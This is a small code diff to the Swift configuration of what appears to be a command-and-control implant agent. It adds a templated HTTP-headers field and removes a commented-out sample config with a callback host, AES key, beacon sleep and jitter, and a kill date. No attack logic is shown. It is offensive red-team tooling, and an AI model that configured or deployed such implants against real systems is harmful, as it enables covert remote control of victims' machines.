@@ -21,6 +21,7 @@ struct AgentConfig {
     var hostHeader: String
     var useSSL: Bool
     var queryParameter: String
+    var httpHeaders: Dictionary<String,String>
     
     // Agent components
     var sleep: Int32
@@ -40,26 +41,9 @@ var agentConfig = AgentConfig(
     hostHeader: "REPLACE_HOST_HEADER",
     useSSL: REPLACE_USE_SSL,
     queryParameter: "REPLACE_QUERY_PARAMETER",
+    httpHeaders: [:REPLACE_HTTP_HEADERS],
     
     sleep: REPLACE_SLEEP,
     jitter: REPLACE_JITTER,
     killDate: "REPLACE_KILL_DATE"
 )
-
-//var agentConfig = AgentConfig(
-//    payloadUUID: "71a909a4-80a2-4b8b-9e2a-44bfb01da81d",
-//    encodedAESKey: "hu9mDeRH4QoXzmSFzwvRPaAxUgk1f+ke5HLZf5gSEBE=",
-//
-//    callbackHost: "192.168.196.3",
-//    getRequestURI: "/index",
-//    postRequestURI: "/data",
-//    callbackPort: 80,
-//    userAgent: "Hermes user agent",
-//    hostHeader: "",
-//    useSSL: false,
-//    queryParameter: "session",
-//
-//    sleep: 5,
-//    jitter: 5,
-//    killDate: "2022-05-01"
-//)
